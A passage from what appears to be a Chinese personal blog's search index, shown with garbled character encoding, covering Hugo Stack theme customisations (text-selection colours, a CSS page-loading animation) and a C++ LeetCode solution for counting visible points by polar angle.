\u0026lt;/article\u0026gt; ä¿®æ”¹å‰ ä¿®æ”¹å é€‰ä¸­æ ·å¼ç¾åŒ– ç›´æ¥ä½¿ç”¨ å¥½å‹çš„æ ·å¼ ï¼Œåœ¨ custom.scss ä¸­æ·»åŠ ï¼š\n::selection { color: #fff; background: #557697; } å¿…é¡»å¤¸ä¸€å¥ï¼Œé¢œè‰²é€‰å¾—ä¸é”™ ğŸ˜† ã€‚\nPart 3 é¡µé¢è½½å…¥åŠ¨ç”» è¿™éƒ¨åˆ†ä¸€å®šè¦å•ç‹¬æ‹å‡ºæ¥ï¼å®ƒå®åœ¨æ˜¯ SO COOLï¼\näº‹æƒ…çš„ç”±æ¥æ˜¯è¿™æ ·çš„ï¼šè™½ç„¶æˆ‘åœ¨å‡ ä¸ªæœˆä¹‹å‰å°±ç»™æˆ‘çš„åšå®¢ï¼ˆåœ¨GitPageä¸Šï¼‰å¸ƒç½®äº† Netlify çš„CDNï¼Œä½†è€ƒè™‘åˆ°å¤§å¢™çš„å½±å“ï¼Œå¶å°”åŠ è½½èµ·æ¥è¿˜æ˜¯æ…¢å¾—åè¡€ã€‚\næ…¢å€’æ˜¯æ— æ‰€è°“ï¼Œå…³é”®æ˜¯ç‚¹å‡»å®Œä¸€ä¸ªé“¾æ¥ä¹‹åè¦åŠ è½½è€åŠå¤©ï¼Œé¡µé¢ä¹Ÿæ²¡ä»€ä¹ˆååº”ï¼Œå°±è·Ÿå®•æœºäº†ä¸€æ ·ï¼Œå¾ˆå°´å°¬çš„ï¼\nä¸ºæ­¤å‘¢ï¼Œæˆ‘å‚è€ƒ æœ›é—´ å¤§ä½¬çš„ è¿™ç¯‡æ–‡ç«  ï¼Œä¸ºæˆ‘çš„åšå®¢ä¹Ÿæäº†ä¸ªé¡µé¢è½½å…¥åŠ¨ç”»ã€‚\nåŠ¨ç”»æ•ˆæœå±•ç¤º è¡¥å……ï¼š\næˆ‘æŠŠé¡µé¢éƒ¨ç½²ä¸Šå»ä¹‹åï¼Œå‘ç°æœ€ç»ˆæ•ˆæœæ¯”è¾ƒä¸€èˆ¬ ğŸ˜¿\nå› ä¸ºè¿™ä¸ªåŠ¨ç”»ä¸»è¦åº”å¯¹çš„æ˜¯ é¡µé¢åŠ è½½äº†ã€ä½†æ²¡å®Œå…¨åŠ è½½ çš„åœºæ™¯ï¼Œè€Œæˆ‘ä»¬çš„ä¸»è¦é—®é¢˜ä¼¼ä¹æ˜¯ç‚¹å‡»é“¾æ¥ä¹‹å è¿é¡µé¢éƒ½åŠ è½½ä¸äº† ğŸ˜¿\nWhateverï¼ŒèŠèƒœäºæ— å§ï¼Œå¤§å¢™å¸¦æ¥çš„é—®é¢˜çœ‹æ¥æ˜¯æ²¡é‚£ä¹ˆå®¹æ˜“å¹³è¡¡æ‰çš„â€¦â€¦\nStep 1 æ–°å¢ç»„ä»¶ è¿™ä¸ªåŠ è½½åŠ¨ç”»çš„å¤§è‡´åŸç†å‘¢ï¼Œå°±æ˜¯åœ¨åŸæœ¬çš„æ¯”è¾ƒå¤§çš„é¡µé¢åŠ è½½å®Œæˆä¹‹å‰ï¼Œå…ˆåŠ è½½å‡ºä¸€äº›æ¯”è¾ƒç®€å•çš„å…ƒç´ ï¼Œä¸ºè¿™äº›å…ƒç´ åˆ¶ä½œä¸€äº›ç®€å•çš„åŠ¨æ•ˆï¼Œè¿™æ ·è®¿å®¢å°±ä¸ä¼šç­‰å¾—å¤ªæ— èŠäº†ï¼ç­‰åŸæœ¬çš„é¡µé¢åŠ è½½å®Œæˆä¹‹åï¼Œå†æŠŠè¿™ä¸ªç»„ä»¶éšåŒ¿æ‰å³å¯ï¼\nå› æ­¤ï¼Œéœ€è¦åœ¨åŸæœ¬çš„ä¸»é¢˜ç»“æ„é‡Œé¢æ–°å¢è·ŸåŠ è½½åŠ¨ç”»ç›¸å…³çš„ç»„ä»¶ã€‚\næˆ‘æŠŠè¿™ä¸ªå°ç»„ä»¶æ”¾åœ¨ layouts/partials/widget/preload.html æ–‡ä»¶é‡Œï¼Œæ³¨æ„ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯è‡ªå·±åˆ›å»ºçš„ï¼š\n{{ if .Site.Params.enablePreloadingAnim }} \u0026lt;div id=\u0026#34;loading-box\u0026#34;\u0026gt; \u0026lt;!-- é¡µé¢åŠ è½½å®Œæˆä¹‹åå¸·å¹•æ‹‰å¼€çš„æ•ˆæœ --\u0026gt; \u0026lt;div class=\u0026#34;loading-left-bg\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;loading-right-bg\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;!-- æ—‹è½¬ç›’å­åŠ¨æ•ˆ --\u0026gt; \u0026lt;div class=\u0026#34;spinner-box\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;configure-border-1\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;configure-core\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;configure-border-2\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;configure-core\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;loading-word\u0026#34;\u0026gt;åŠ è½½ä¸­...\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- é¡µé¢åŠ è½½åŠ¨ç”» --\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function () { document.getElementById(\u0026#39;loading-box\u0026#39;).classList.add(\u0026#34;loaded\u0026#34;) }) \u0026lt;/script\u0026gt; {{ end }} å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œé¢æœ‰å‡ ä¸ªç»„æˆéƒ¨åˆ†ï¼Œéå¸¸ç®€å•ï¼š\nHugoçš„ if åˆ¤æ–­å¥ï¼Œä¾¿äºæˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶é‡Œæ§åˆ¶è¿™ä¸ªç»„ä»¶è¦ä¸è¦å¯ç”¨ï¼› ç”¨äºå‘ˆç°åŠ¨æ•ˆçš„å‡ ä¸ªç®€å•çš„HTMLå…ƒç´ ï¼› jQueryçš„å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨ ready å‡½æ•°ï¼Œå½“é¡µé¢è½½å…¥å®Œæˆä¹‹åæŠŠåŠ¨æ•ˆç»„ä»¶éšåŒ¿æ‰ï¼ ä¸‡äº‹ä¿±å¤‡ï¼ŒæŠŠè¿™ä¸ªç»„ä»¶ç›´æ¥åŠ åˆ°ç½‘ç«™æ¨¡æ¿é‡Œé¢å°±è¡Œäº†ï¼Stackä¸»é¢˜çš„ç½‘é¡µæ¨¡æ¿åœ¨ layouts/_default/baseof.html ï¼Œæˆ‘ä»¬æ‰¾åˆ° body æ ‡ç­¾ï¼Œåœ¨å®ƒåº•ä¸‹åŠ ä¸Šè¿™ä¹ˆä¸€å¥ï¼š\n\u0026lt;body class=\u0026#34;{{ block `body-class` . }}{{ end }}\u0026#34;\u0026gt; \u0026lt;!-- ä¸‹é¢è¿™ä¸ªæ˜¯æ–°åŠ çš„ --\u0026gt; {{- partial \u0026#34;widget/preload\u0026#34; . -}} \u0026lt;!-- ä¸‹é¢å°±æ˜¯Stackä½œè€…åŸæœ¬çš„ä»£ç äº† --\u0026gt; {{- partial \u0026#34;head/colorScheme\u0026#34; . -}} \u0026lt;!-- çœç•¥çœç•¥çœç•¥ --\u0026gt; \u0026lt;/body\u0026gt; ä¸€åˆ‡å°±OKäº†ï¼\nStep 2 ç»„ä»¶æ ·å¼ æˆ‘ä»¬åˆšæ‰çœ‹åˆ°çš„jQueryå‡½æ•°éå¸¸ç®€å•ï¼Œæ˜¯å› ä¸ºè¿™ä¸ªåŠ¨æ•ˆæœ€çµé­‚çš„åœ°æ–¹æ˜¯åœ¨ç»„ä»¶çš„CSSå•Šï¼\næ‰¾åˆ°è€æœ‹å‹ assets/scss/custom.scss ï¼Œåœ¨æ–‡ä»¶é‡Œé¢ è¿½åŠ  ï¼š\n#loading-box .loading-left-bg, #loading-box .loading-right-bg { position: fixed; z-index: 1000; width: 50%; height: 100%; // æˆ‘åœ¨è¿™é‡Œå°æ”¹äº†ä¸€ä¸‹é¢œè‰²ï¼Œ background-color: #b1c0c7; transition: all 0.5s; } #loading-box .loading-right-bg { right: 0; } #loading-box\u0026gt;.spinner-box { position: fixed; z-index: 1001; display: flex; justify-content: center; align-items: center; width: 100%; height: 100vh; } #loading-box .spinner-box .configure-border-1 { position: absolute; padding: 3px; width: 115px; height: 115px; background: #ffab91; animation: configure-clockwise 3s ease-in-out 0s infinite alternate; } #loading-box .spinner-box .configure-border-2 { left: -115px; padding: 3px; width: 115px; height: 115px; background: rgb(63, 249, 220); transform: rotate(45deg); animation: configure-xclockwise 3s ease-in-out 0s infinite alternate; } #loading-box .spinner-box .loading-word { position: absolute; color: #ffffff; // æˆ‘åœ¨è¿™é‡Œå°æ”¹äº†ä¸€ä¸‹æ–‡å­—å¤§å°å’Œå­—ä½“ï¼Œæ³¨æ„ï¼ font-size: 1.8rem; font-family: \u0026#39;Zhi Mang Xing\u0026#39;, cursive; } #loading-box .spinner-box .configure-core { width: 100%; height: 100%; background-color: #37474f; } div.loaded div.loading-left-bg { transform: translate(-100%, 0); } div.loaded div.loading-right-bg { transform: translate(100%, 0); } div.loaded div.spinner-box { // ä½ å¯ä»¥æŠŠè¿™ä¸ªæ³¨é‡Šæ‰ï¼Œè¿™æ ·å°±èƒ½ä¸€ç›´çœ‹é‚£ä¸ªåŠ¨ç”»çš„æ•ˆæœäº†ï¼ display: none !important; } @keyframes configure-clockwise { 0% { transform: rotate(0); } 25% { transform: rotate(90deg); } 50% { transform: rotate(180deg); } 75% { transform: rotate(270deg); } 100% { transform: rotate(360deg); } } @keyframes configure-xclockwise { 0% { transform: rotate(45deg); } 25% { transform: rotate(-45deg); } 50% { transform: rotate(-135deg); } 75% { transform: rotate(-225deg); } 100% { transform: rotate(-315deg); } } OKï¼Œæå®šï¼\nåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ²¡å¿…è¦ææ¸…æ¥šåŠ¨ç”»åŸç†ï¼Œå› ä¸ºæˆ‘æ„Ÿè§‰è¿™ä¸ªåŠ¨ç”»è‡ªå®šä¹‰çš„ç©ºé—´ä¸å¤§äº†ã€‚è¯»è€…å¯ä»¥åœ¨ç½‘ç»œä¸ŠæŸ¥æ‰¾ä¸€ä¸‹ CSSé¡µé¢è½½å…¥åŠ¨ç”» è¿™ç§ç›¸å…³å†…å®¹ï¼Œä¼šå‘ç°å…¶å®å·²ç»æœ‰è¶…çº§å¤šè®¾è®¡å¸ˆå¤§ç‰›æŠŠä»–ä»¬çš„ä½œå“å¼€æºäº†ï¼Œæˆ‘ä»¬æ²¡å¿…è¦è‡ªå·±è°ƒæ•´ï¼Œæ€»èƒ½æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ»¡æ„çš„å•¦ï¼\nStep 3 é…ç½®æ–‡ä»¶ å®Œæˆä¸Šé¢ä¸¤æ­¥ä¹‹åï¼ŒåŠ¨ç”»æš‚æ—¶è¿˜ä¸èƒ½ç”Ÿæ•ˆï¼Œå› ä¸ºæˆ‘ä»¬æ–°å¢ç»„ä»¶çš„æ—¶å€™åŠ äº†ä¸ª if åˆ¤æ–­ï¼Œè¿˜è®°å¾—å—ï¼Ÿ\nåœ¨é…ç½®æ–‡ä»¶çš„ç›¸åº”ä½ç½®ï¼ˆæˆ‘è¿™é‡Œæ˜¯ params æ ç›®åº•ä¸‹ï¼‰åŠ ä¸Š enablePreloadingAnim: true è¿™ä¸ªé”®å€¼å¯¹ï¼Œç„¶åå°±å¯ä»¥äº«å—è¿™ä¸ªå¾ˆæ£’çš„è½½å…¥åŠ¨ç”»äº†ï¼\nTo Be Continued\u0026hellip; æ–‡ç« é¡µé¢å¾®è°ƒï¼ˆwhite-space: nowrapï¼›ç›®å½•é¡¹ç´§å‡‘ï¼›â€¦â€¦ï¼‰ ä¸»é¡µä¾§è¾¹æ ä¸äº® æ–‡ç« æ·»åŠ è¿”å›æœ€ä¸Šå±‚ ç ”ç©¶åœ¨çº¿å­—ä½“ ä¿®æ”¹æ–‡ç« é¡µé¢çš„ è¿”å› æŒ‰é’®çš„è·³è½¬é€»è¾‘ï¼ˆä¸è¦ç›´æ¥å›åˆ°ä¸»é¡µï¼Œæœ€å¥½å›åˆ°ä¸Šä¸€çº§ï¼‰ ç ”ç©¶SVGåŠ¨ç”»ï¼ŒæŠŠåŠ è½½åŠ¨ç”»ä¼˜åŒ–æˆSVGç»˜åˆ¶åœŸæ¥¼ï¼ï¼ˆç¦å»ºäººçš„æ‰§å¿µå•Šï¼‰ ä¿®å¤ archieves é¡µé¢é¡¶éƒ¨ï¼Œcategoriesç”¨çš„ article-tile çš„é—®é¢˜ï¼ˆä¹‹å‰æ”¹ç›¸å…³æ–‡ç« ç»„ä»¶ï¼ŒæŠŠè¿™ä¸ªä¸œè¥¿å½±å“åˆ°äº† ğŸ˜ ï¼‰ ","date":"2022-01-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/hugo-stack%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0/","title":"Hugo Stackä¸»é¢˜æ›´æ–°å°è®°"},{"content":"è®¸ä¹…ä¸æ›¾åšç®—æ³•é¢˜äº†ï¼Œä»Šå¤©çš„æ¯æ—¥ä¸€é¢˜æ˜¯é“Hardï¼Œè€Œæˆ‘ç‹¬ç«‹åœ°å°†å®ƒæå®šäº†ï¼Œå³ä¾¿å®ƒåªæœ‰Mediumçš„ç¨‹åº¦ã€‚\nå®é™…ä¸Šæ˜¯ä¸€é“æ²¡ä»€ä¹ˆæ„æ€çš„é¢˜ç›®ï¼Œæœ¬ç¯‡ä¸»è¦è®°å½•å‡ ä¸ªæ€ç»´ä¸Šçš„ä¸è¶³ç‚¹ã€‚\né¢˜ç›® ç»™ä½ ä¸€ä¸ªç‚¹æ•°ç»„ points å’Œä¸€ä¸ªè¡¨ç¤ºè§’åº¦çš„æ•´æ•° angle ï¼Œä½ çš„ä½ç½®æ˜¯ location ï¼Œå…¶ä¸­ location = [posx, posy] ä¸” points[i] = [xi, yi] éƒ½è¡¨ç¤º X-Y å¹³é¢ä¸Šçš„æ•´æ•°åæ ‡ã€‚\næœ€å¼€å§‹ï¼Œä½ é¢å‘ä¸œæ–¹è¿›è¡Œè§‚æµ‹ã€‚ä½  ä¸èƒ½ è¿›è¡Œç§»åŠ¨æ”¹å˜ä½ç½®ï¼Œä½†å¯ä»¥é€šè¿‡ è‡ªè½¬ è°ƒæ•´è§‚æµ‹è§’åº¦ã€‚æ¢å¥è¯è¯´ï¼Œposx å’Œ posy ä¸èƒ½æ”¹å˜ã€‚ä½ çš„è§†é‡èŒƒå›´çš„è§’åº¦ç”¨ angle è¡¨ç¤ºï¼Œ è¿™å†³å®šäº†ä½ è§‚æµ‹ä»»æ„æ–¹å‘æ—¶å¯ä»¥å¤šå®½ã€‚è®¾ d ä¸ºä½ é€†æ—¶é’ˆè‡ªè½¬æ—‹è½¬çš„åº¦æ•°ï¼Œé‚£ä¹ˆä½ çš„è§†é‡å°±æ˜¯è§’åº¦èŒƒå›´ [d - angle/2, d + angle/2] æ‰€æŒ‡ç¤ºçš„é‚£ç‰‡åŒºåŸŸã€‚\nå¯¹äºæ¯ä¸ªç‚¹ï¼Œå¦‚æœç”±è¯¥ç‚¹ã€ä½ çš„ä½ç½®ä»¥åŠä»ä½ çš„ä½ç½®ç›´æ¥å‘ä¸œçš„æ–¹å‘å½¢æˆçš„è§’åº¦ ä½äºä½ çš„è§†é‡ä¸­ ï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥çœ‹åˆ°å®ƒã€‚\nåŒä¸€ä¸ªåæ ‡ä¸Šå¯ä»¥æœ‰å¤šä¸ªç‚¹ã€‚ä½ æ‰€åœ¨çš„ä½ç½®ä¹Ÿå¯èƒ½å­˜åœ¨ä¸€äº›ç‚¹ï¼Œä½†ä¸ç®¡ä½ çš„æ€ä¹ˆæ—‹è½¬ï¼Œæ€»æ˜¯å¯ä»¥çœ‹åˆ°è¿™äº›ç‚¹ã€‚åŒæ—¶ï¼Œç‚¹ä¸ä¼šé˜»ç¢ä½ çœ‹åˆ°å…¶ä»–ç‚¹ã€‚\nè¿”å›ä½ èƒ½çœ‹åˆ°çš„ç‚¹çš„æœ€å¤§æ•°ç›®ã€‚\nç¤ºä¾‹1\nexp1 è¾“å…¥ï¼š points = [[2,1],[2,2],[3,3]], angle = 90, location = [1,1] è¾“å‡ºï¼š 3 è§£é‡Šï¼š é˜´å½±åŒºåŸŸä»£è¡¨ä½ çš„è§†é‡ã€‚åœ¨ä½ çš„è§†é‡ä¸­ï¼Œæ‰€æœ‰çš„ç‚¹éƒ½æ¸…æ™°å¯è§ï¼Œå°½ç®¡ [2,2] å’Œ [3,3]åœ¨åŒä¸€æ¡ç›´çº¿ä¸Šï¼Œä½ ä»ç„¶å¯ä»¥çœ‹åˆ° [3,3] ã€‚ ç¤ºä¾‹2\nexp2 è¾“å…¥ï¼š points = [[1,0],[2,1]], angle = 13, location = [1,1] è¾“å‡ºï¼š 1 æ•°æ®èŒƒå›´\n1 \u0026lt;= points.length \u0026lt;= 105 points[i].length == 2 location.length == 2 0 \u0026lt;= angle \u0026lt; 360 0 \u0026lt;= posx, posy, xi, yi \u0026lt;= 100 åˆ†æ æ ¹æ®æ•°æ®èŒƒå›´ï¼Œå°è¯•é‡‡ç”¨ O(nlogn) çš„è§£æ³•å³å¯ã€‚\né—®é¢˜è½¬åŒ– åœ¨è®¡ç®—å¯è§èŒƒå›´æ—¶ï¼Œæˆ‘ä»¬ä¸€å®šè¦è€ƒè™‘åˆ°çš„ä¸œè¥¿ä¸æ˜¯åæ ‡ï¼Œè€Œæ˜¯è§’åº¦ï¼Œå³ æŸä¸ªç‚¹ä¸è§‚æµ‹ç‚¹çš„å¤¹è§’ ã€‚\nå¯¹äºç»™å®šçš„ä»»æ„ä¸€ä¸ªç‚¹ï¼Œæˆ‘ä»¬å°†å®ƒä½œä¸ºè§‚æµ‹è§’çš„ ä¸‹è¾¹ ï¼Œç„¶åä»¥è¿™æ¡è¾¹ä¸ºèµ·ç‚¹ï¼Œé€†æ—¶é’ˆè½¬ angle çš„è§’åº¦ï¼Œå³å¯å¾—åˆ°è§‚æµ‹èŒƒå›´çš„ ä¸Šè¾¹ ï¼Œè¿™æ ·å°±èƒ½å¾—åˆ°ä¸€ä¸ªè§‚æµ‹èŒƒå›´ã€‚\nå¯¹äºè¿™ç§å®Œå…¨ä¾èµ– å¤¹è§’è§’åº¦ è€Œä¸ä¾èµ– åæ ‡ çš„æ€è·¯ï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿæƒ³åˆ° å°†ç›´è§’åæ ‡è½¬åŒ–ä¸ºæåæ ‡ ã€‚\næ‰€è°“ æåæ ‡ ï¼Œæ˜¯ä»¥è§‚æµ‹ç‚¹ä¸ºåŸç‚¹ï¼Œå°†æŸç‚¹è¡¨ç¤ºä¸º (Ï,Î¸) çš„å½¢å¼ï¼Œå³è¡¨ç¤ºä¸º (æå¾„,æè§’) çš„å½¢å¼ã€‚\nè¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦ç¡®åˆ‡çŸ¥é“æŸä¸ªç‚¹åˆ°è§‚æµ‹ç‚¹çš„è·ç¦»ï¼Œåªéœ€è¦çŸ¥é“å®ƒçš„ æè§’ ï¼Œå³å®ƒå’Œè§‚æµ‹ç‚¹çš„å¤¹è§’ï¼Œçº¦å®šä»¥Xè½´æ­£æ–¹å‘ä¸ºé›¶åº¦ï¼Œé€†æ—¶é’ˆå¢åŠ åº¦æ•°ã€‚\nå› æ­¤å¾—åˆ°äº†ä¸€ä¸ªå°†ç›´è§’åæ ‡è½¬åŒ–ä¸ºæåæ ‡çš„å‡½æ•°ï¼š\n#define PI 3.1415926535897932384626 vector\u0026lt;double\u0026gt; pointsInPolar; int numberOfSuperpositionPoints; void changePointsIntoPolar(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; points, vector\u0026lt;int\u0026gt;\u0026amp; O) { int ox = O[0]; int oy = O[1]; numberOfSuperpositionPoints = 0; for (auto p : points) { int px = p[0]; int py = p[1]; if (px == ox \u0026amp;\u0026amp; py == oy) { numberOfSuperpositionPoints++; continue; } if (px == ox) { if (py \u0026gt; oy) pointsInPolar.push_back(90.0); else { pointsInPolar.push_back(-90.0); pointsInPolar.push_back(270.0); } continue; } // è®¡ç®—å¤¹è§’ double pointAngleInPolar = atan2(py - oy, px - ox) * 180 / PI; pointsInPolar.push_back(pointAngleInPolar); if (pointAngleInPolar \u0026lt; 0) pointsInPolar.push_back(pointAngleInPolar + 360.0); } sort(pointsInPolar.begin(), pointsInPolar.end()); return ; } æœ‰å‡ ä¸ªé‡ç‚¹è¦æ³¨æ„ï¼š\nC++å‡½æ•° atan2 ç”¨æ³•å‚è§ atan2 - C++ Reference (cplusplus.com) ï¼Œå®ƒå¾—åˆ°çš„å€¼æ˜¯ å¼§åº¦ ï¼Œè¦è½¬ä¸ºè§’åº¦ï¼ˆä¹˜180å†é™¤ä»¥Ï€ï¼‰ï¼› å½“ç»™å‡ºçš„ç‚¹å’Œè§‚æµ‹ç‚¹é‡åˆï¼Œè®¤ä¸ºå®ƒæ°¸è¿œå¤„äºè§†é‡èŒƒå›´å†…ï¼Œç”¨ä¸€ä¸ªå˜é‡ numberOfSuperpositionPoints åŠ ä»¥è®°å½•ã€‚ å½“ä¸¤ä¸ªç‚¹çš„ X åæ ‡ç›¸ç­‰ï¼Œè¦æ ¹æ® Y åæ ‡çš„å¤§å°åˆ¤æ–­è§’åº¦ã€‚ è´Ÿæ•°çš„è§’åº¦è¡¨ç¤ºä» X è½´æ­£æ–¹å‘ é¡ºæ—¶é’ˆ æ—‹è½¬ï¼Œé‚£ä¹ˆè¿™ç§è´Ÿæ•°è§’åº¦åº”è¯¥ä¹Ÿæœ‰æ­£æ•°è¡¨ç¤ºï¼Œå³åŠ ä¸Š 360Â° ã€‚ ç¬¬ä¸‰ç‚¹å¾ˆé‡è¦ï¼Œå¹¶å½±å“åˆ°ç¬¬äºŒç‚¹ ã€ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å¯¹äºè´Ÿæ•°è§’åº¦çš„å¤„ç†ï¼Œå‡å¦‚æˆ‘ä»¬æœ‰ä¸€ç»„æ•°æ®ï¼š\n[[0,0],[0,2]]\n90\n[1,1]\nexp data å¦‚æœæ”¾ä»»è´Ÿæ•°è§’åº¦ä¸ç®¡ï¼Œæˆ‘ä»¬å¾—åˆ°çš„è½¬åŒ–ä¸ºæåæ ‡çš„ç‚¹åº”è¯¥æ˜¯ [-135.0, 135.0] ï¼Œè¿™æ ·ï¼Œä¸ç®¡ä»¥å“ªä¸ªç‚¹ä¸ºè§†é‡ä¸‹è¾¹ï¼ŒåŠ ä¸Šäº† 90Â° çš„è§‚å¯Ÿè§’ï¼Œéƒ½æ— æ³•çœ‹åˆ°å¦ä¸€ä¸ªç‚¹äº†ã€‚\nè€ŒæŒ‰ç…§æˆ‘ä»¬çš„ä»£ç ä¸­çš„å¤„ç†åŠæ³•ï¼Œå¯¹äºè¿™ä¸ªè´Ÿè§’åº¦çš„ç‚¹ï¼Œæˆ‘ä»¬é¢å¤–å°†å®ƒçš„ç­‰ä»·æ­£è§’åº¦ç‚¹æ”¾å…¥äº†é›†åˆä¸­ï¼Œå³åº”è¯¥å¾—åˆ° [-135.0, 135.0, 225.0] çš„é›†åˆï¼Œé‚£ä¹ˆåªè¦ä»¥ 135.0Â° ä¸ºè§†é‡ä¸‹è¾¹ï¼Œç„¶ååŠ ä¸Š 90Â° çš„è§‚å¯Ÿè§’ï¼Œå°±èƒ½å¤Ÿçœ‹åˆ° 225Â° çš„ç‚¹ï¼Œå®é™…ä¸Šå°±æ˜¯åˆšæ‰è¢«å¿½ç•¥çš„è´Ÿè§’åº¦çš„ç‚¹ã€‚\nè¿™æ ·åšå®é™…ä¸Šæœ‰ä¸å°çš„åå¤„ï¼Œé‚£å°±æ˜¯ å¼•å…¥é¢å¤–çš„ç©ºé—´å’Œæ—¶é—´å¤æ‚åº¦ ï¼æœ¬æ¥åªæœ‰ä¸€ä¸ªè´Ÿè§’åº¦ç‚¹ï¼Œç°åœ¨è¦é¢å¤–å­˜å‚¨å¹¶è®¡ç®—å®ƒçš„ç­‰ä»·æ­£è§’åº¦ç‚¹ï¼Œè¿˜æ˜¯å¾ˆèŠ±è´¹ç©ºé—´å’Œæ—¶é—´çš„ã€‚\nä½†æ˜¯æˆ‘ä»Šå¤©åªæ˜¯ä½œä¸€ä¸ªé”™é¢˜çš„è®°å½•ï¼Œå°±ä¸è€ƒè™‘å®ƒçš„ä¼˜åŒ–æ–¹æ¡ˆäº†ã€‚\næ±‚è§£ ç°åœ¨æˆ‘ä»¬å·²çŸ¥è§†é‡ä¸‹è¾¹å’Œè§‚å¯Ÿè§’ï¼Œç›¸å½“äºä¹Ÿå·²çŸ¥è§†é‡ä¸Šè¾¹äº†ã€‚è¦å¿«é€Ÿä»æ‰€æœ‰ç‚¹ä¸­æ‰¾åˆ°å¯è§ç‚¹çš„æ•°ç›®ï¼Œå¾ˆç®€å•ï¼Œåšä¸€ä¸ªäºŒåˆ†æŸ¥æ‰¾å³å¯ã€‚\nä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„åŠæ³•å¿«é€Ÿæ‰¾åˆ° ç¬¬ä¸€ä¸ªè§†é‡ä¸Šè¾¹ä¹‹ä¸Š çš„ç‚¹ã€‚\nint calcVvisiablePointsNumber(int startPointIndex, int visiableAngle) { double finalVisiablePoint = pointsInPolar[startPointIndex] + visiableAngle; int l = 0; int r = pointsInPolar.size() - 1; if (pointsInPolar[r] \u0026lt;= finalVisiablePoint) return r - startPointIndex + 1; while (l \u0026lt;= r) { int mid = (l + r) \u0026gt;\u0026gt; 1; if (pointsInPolar[mid] \u0026lt;= finalVisiablePoint) l = mid + 1; else r = mid - 1; } return l - startPointIndex; } æˆ‘ä»¬éå†æ‰€æœ‰ç‚¹ï¼Œåˆ†åˆ«ä»¥å®ƒä»¬ä½œä¸ºè§†é‡ä¸‹è¾¹ï¼Œç”¨äºŒåˆ†æ±‚å‡ºå¯è§ç‚¹æ•°ï¼Œæ—¶é—´å¤æ‚åº¦ O(nlogn) ã€‚\nAC ä»£ç  class Solution { private: #define PI 3.1415926535897932384626 vector\u0026lt;double\u0026gt; pointsInPolar; int numberOfSuperpositionPoints; public: void changePointsIntoPolar(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; points, vector\u0026lt;int\u0026gt;\u0026amp; O) { int ox = O[0]; int oy = O[1]; numberOfSuperpositionPoints = 0; for (auto p : points) { int px = p[0]; int py = p[1]; if (px == ox \u0026amp;\u0026amp; py == oy) { numberOfSuperpositionPoints++; continue; } if (px == ox) { if (py \u0026gt; oy) pointsInPolar.push_back(90.0); else { pointsInPolar.push_back(-90.0); pointsInPolar.push_back(270.0); } continue; } // è®¡ç®—å¤¹è§’ double pointAngleInPolar = atan2(py - oy, px - ox) * 180 / PI; pointsInPolar.push_back(pointAngleInPolar); if (pointAngleInPolar \u0026lt; 0) pointsInPolar.push_back(pointAngleInPolar + 360.0); } sort(pointsInPolar.begin(), pointsInPolar.end()); return ; } int calcVvisiablePointsNumber(int startPointIndex, int visiableAngle) { double finalVisiablePoint = pointsInPolar[startPointIndex] + visiableAngle; int l = 0; int r = pointsInPolar.size() - 1; if (pointsInPolar[r] \u0026lt;= finalVisiablePoint) return r - startPointIndex + 1; while (l \u0026lt;= r) { int mid = (l + r) \u0026gt;\u0026gt; 1; if (pointsInPolar[mid] \u0026lt;= finalVisiablePoint) l = mid + 1; else r = mid - 1; } return l - startPointIndex; } void debugOut() { for (auto agl : pointsInPolar) cout \u0026lt;\u0026lt; agl \u0026lt;\u0026lt; \u0026#34; \u0026#34;; cout \u0026lt;\u0026lt; endl; } int visiblePoints(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; points, int angle, vector\u0026lt;int\u0026gt;\u0026amp; location) { changePointsIntoPolar(points, location); int res = numberOfSuperpositionPoints; // debugOut(); for (int i = 0; i \u0026lt; pointsInPolar.size(); i++) { int nowVisiablePointNumber = calcVvisiablePointsNumber(i, angle); res = max(res, nowVisiablePointNumber + numberOfSuperpositionPoints); } return res; } }; Performance é”™è¯¯è®°å½• In factï¼Œæˆ‘çš„ä»£ç è¡¨ç°è›®å·®åŠ²çš„ï¼Œä½†ä¹Ÿä½œä¸ºæˆ‘èŠ±è´¹ä¸€å®šæ—¶é—´å’Œè„‘åŠ›ç‹¬ç«‹è§£å†³çš„ä¸€é“å›°éš¾é¢˜åŠ ä»¥è®°å½•ï¼Œä»…ä¾›è‡ªå¨±è‡ªä¹ç½¢äº†ã€‚\nå¯ä»¥çœ‹åˆ°æˆ‘WAäº†å¤šå°‘æ¬¡ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹ä¸­çš„è‹¥å¹²ç›²åŒºï¼š\nè´Ÿè§’åº¦ç‚¹æ²¡æœ‰è½¬åŒ–ç­‰ä»·ä¸ºæ­£è§’åº¦ï¼› å¿½è§†äº†â€œé‡åˆç‚¹æ°¸è¿œå¯è§â€è¿™ä¸ªé“ç†ï¼› äºŒåˆ†è¾¹ç•Œã€‚ 